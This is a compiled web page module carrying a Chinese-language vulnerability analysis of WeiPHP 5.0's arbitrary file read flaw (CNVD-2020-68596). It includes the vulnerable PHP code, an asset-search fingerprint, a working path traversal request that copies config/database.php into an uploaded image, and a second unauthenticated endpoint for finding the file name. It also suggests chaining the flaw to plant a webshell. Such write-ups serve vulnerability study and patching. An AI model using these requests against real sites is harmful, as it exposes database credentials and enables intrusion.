import{_ as s}from"./plugin-vue_export-helper-c27b6911.js";import{r as l,o as t,c,a as i,b as e,d as a,e as d}from"./app-58e4a7d6.js";const r={},p=d(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Weiphp5.0 存在前台文件任意读取漏洞，可以读取数据库配置等敏感文件</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Weiphp &lt;= 5.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;WeiPHP&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2>`,7),v={href:"https://www.weiphp.cn/doc/Initialization_database.html",target:"_blank",rel:"noopener noreferrer"},u=d(`<p>参考官方手册创建网站即可</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181559468.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>漏洞函数文件:<code>application\\material\\controller\\Material.php</code></p><p>漏洞函数:<code>_download_imgage</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181600401.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>public function _download_imgage($media_id, $picUrl = &#39;&#39;, $dd = null)
    {
        $savePath = SITE_PATH . &#39;/public/uploads/picture/&#39; . time_format(NOW_TIME, &#39;Y-m-d&#39;);
        mkdirs($savePath);
        $cover_id = 0;
        if (empty($picUrl)) {
            // 获取图片URL
            $url = &#39;https://api.weixin.qq.com/cgi-bin/material/get_material?access_token=&#39; . get_access_token();
            $param[&#39;media_id&#39;] = $media_id;
            // dump($url);
            $picContent = post_data($url, $param, &#39;json&#39;, false);
            $picjson = json_decode($picContent, true);
            // dump($picjson);die;
            if (isset($picjson[&#39;errcode&#39;]) &amp;&amp; $picjson[&#39;errcode&#39;] != 0) {
                $cover_id = do_down_image($media_id, $dd[&#39;thumb_url&#39;]);
                if (!$cover_id) {
                    return 0;
                    exit();
                }
            }
            $picName = NOW_TIME . uniqid() . &#39;.jpg&#39;;
            $picPath = $savePath . &#39;/&#39; . $picName;
            $res = file_put_contents($picPath, $picContent);
        } else {
            $content = wp_file_get_contents($picUrl);
            // 获取图片扩展名
            $picExt = substr($picUrl, strrpos($picUrl, &#39;=&#39;) + 1);
            if (empty($picExt) || $picExt == &#39;jpeg&#39; || strpos(&#39;jpg,gif,png,jpeg,bmp&#39;, $picExt) === false) {
                $picExt = &#39;jpg&#39;;
            }
            $picName = NOW_TIME . uniqid() . &#39;.&#39; . $picExt;
            $picPath = $savePath . &#39;/&#39; . $picName;
            $res = file_put_contents($picPath, $content);
            if (!$res) {
                $cover_id = do_down_image($media_id);
                if (!$cover_id) {
                    return 0;
                    exit();
                }
            }
        }

        if ($res) {
            $file = array(
                &#39;name&#39; =&gt; $picName,
                &#39;type&#39; =&gt; &#39;application/octet-stream&#39;,
                &#39;tmp_name&#39; =&gt; $picPath,
                &#39;size&#39; =&gt; $res,
                &#39;error&#39; =&gt; 0
            );

            $File = D(&#39;home/Picture&#39;);
            $cover_id = $File-&gt;addFile($file);
        }
        return $cover_id;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>首先注意到函数的标识为<code>public</code>，也就是这个函数是公共调用的，并且变量<code>picUrl</code>为可控变量</p><p>根据代码从上向下分析</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$savePath = SITE_PATH . &#39;/public/uploads/picture/&#39; . time_format(NOW_TIME, &#39;Y-m-d&#39;);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>else {
            $content = wp_file_get_contents($picUrl);
            // 获取图片扩展名
            $picExt = substr($picUrl, strrpos($picUrl, &#39;=&#39;) + 1);
            if (empty($picExt) || $picExt == &#39;jpeg&#39; || strpos(&#39;jpg,gif,png,jpeg,bmp&#39;, $picExt) === false) {
                $picExt = &#39;jpg&#39;;
            }
            $picName = NOW_TIME . uniqid() . &#39;.&#39; . $picExt;
            $picPath = $savePath . &#39;/&#39; . $picName;
            $res = file_put_contents($picPath, $content);
            if (!$res) {
                $cover_id = do_down_image($media_id);
                if (!$cover_id) {
                    return 0;
                    exit();
                }
            }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>分析传入变量 <code>picUrl</code> 的 <code>wp_file_get_contents</code>方法</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$content = wp_file_get_contents($picUrl);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>函数文件位置 <code>application\\common.php</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181601465.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可以看到这里没有对我们的参数进行过滤，只做了一个有关超时的操作, 回到函数继续向下分析</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$picExt = substr($picUrl, strrpos($picUrl, &#39;=&#39;) + 1);
if (empty($picExt) || $picExt == &#39;jpeg&#39; || strpos(&#39;jpg,gif,png,jpeg,bmp&#39;, $picExt) === false) {
                $picExt = &#39;jpg&#39;;
}
$picName = NOW_TIME . uniqid() . &#39;.&#39; . $picExt;
$picPath = $savePath . &#39;/&#39; . $picName;
$res = file_put_contents($picPath, $content);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里创建了有关当前时间的图片文件，并写入文件夹<code>/public/uploads/picture/</code> 下</p><p>我们先尝试控制变量 <code>$picUrl</code> 来写入数据库配置文件到图片中</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/public/index.php/material/Material/_download_imgage?media_id=1&amp;picUrl=./../config/database.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181601329.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>查看目录<code>/public/uploads/picture/</code>，并用记事本打开写入的jpg文件</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181601445.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>得到数据库配置文件的信息，既然这个变量可控，我们也可以通过这个方法下载木马文件，再通过解析漏洞或者文件包含等其他漏洞来getshell</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181602698.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在当前条件下并不知道文件名是什么，所以回到代码中继续寻找可以获取文件名的办法</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181602112.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>if ($res) {
            $file = array(
                &#39;name&#39; =&gt; $picName,
                &#39;type&#39; =&gt; &#39;application/octet-stream&#39;,
                &#39;tmp_name&#39; =&gt; $picPath,
                &#39;size&#39; =&gt; $res,
                &#39;error&#39; =&gt; 0
            );

            $File = D(&#39;home/Picture&#39;);
            $cover_id = $File-&gt;addFile($file);
        }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>向下跟进 <code>addFile</code> 函数</p><p>函数位置:<code>application\\home\\model\\Picture.php</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181602963.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>function addFile($file)
    {
        $data[&#39;md5&#39;] = md5_file($file[&#39;tmp_name&#39;]);
        $id = $this-&gt;where(&#39;md5&#39;, $data[&#39;md5&#39;])-&gt;value(&#39;id&#39;);
        if ($id &gt; 0) {
            return $id;
        }

        $info = pathinfo($file[&#39;tmp_name&#39;]);
        $data[&#39;path&#39;] = str_replace(SITE_PATH . &#39;/public&#39;, &#39;&#39;, $file[&#39;tmp_name&#39;]);

        $data[&#39;sha1&#39;] = hash_file(&#39;sha1&#39;, $file[&#39;tmp_name&#39;]);
        $data[&#39;create_time&#39;] = NOW_TIME;
        $data[&#39;status&#39;] = 1;
        $data[&#39;wpid&#39;] = get_wpid();

        $id = $this-&gt;insertGetId($data);
        return $id;
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到这部分代码写入了 Picture 表中</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$id = $this-&gt;insertGetId($data);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>我们查看一下数据库的这个数据表，可以发现之前所上传的数据全部缓存在这个表里了</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181602824.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>我们现在则需要找到不需要登录的地方来获得这些数据，所以可以全局去查找调用了这个 Picture 表的地方</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181603655.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>找到一处可以利用的地方</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>function user_pics()
    {
        $map[&#39;wpid&#39;] = get_wpid();
        $picList = M(&#39;Picture&#39;)-&gt;where(wp_where($map))
            -&gt;order(&#39;id desc&#39;)
            -&gt;select();
        $this-&gt;assign(&#39;picList&#39;, $picList);
        exit($this-&gt;fetch());
    }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>跟进 <code>get_wpid</code> 函数</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>function get_wpid($wpid = &#39;&#39;)
{
    if (defined(&#39;WPID&#39;)) {
        return WPID;
    } else {
        return 0;
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>查看 WPID 的定义，文件位置在<code>config\\weiphp_define.php</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205181603854.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>定义值默认为 1，所以这里调用则可以获得数据库中Pictrue表的内容，间接的知道了文件内容以及文件名</p>`,44),m={href:"http://webphp/public/index.php/home/file/user_pids",target:"_blank",rel:"noopener noreferrer"},o=i("figure",null,[i("img",{src:"https://cb86160.webp.li/makabaka-r1-photo/202205181604752.png",alt:"",tabindex:"0",loading:"lazy"}),i("figcaption")],-1),b=i("p",null,"可以看到文件名，根据url地址访问选择下载即可",-1);function g($,h){const n=l("ExternalLinkIcon");return t(),c("div",null,[p,i("p",null,[i("a",v,[e("weiphp5.0官方下载参考手册"),a(n)])]),u,i("p",null,[e("访问地址: "),i("a",m,[e("http://webphp/public/index.php/home/file/user_pids"),a(n)])]),o,b])}const x=s(r,[["render",g],["__file","WeiPHP5.0 download_imgage 前台文件任意读取 CNVD-2020-68596.html.vue"]]);export{x as default};
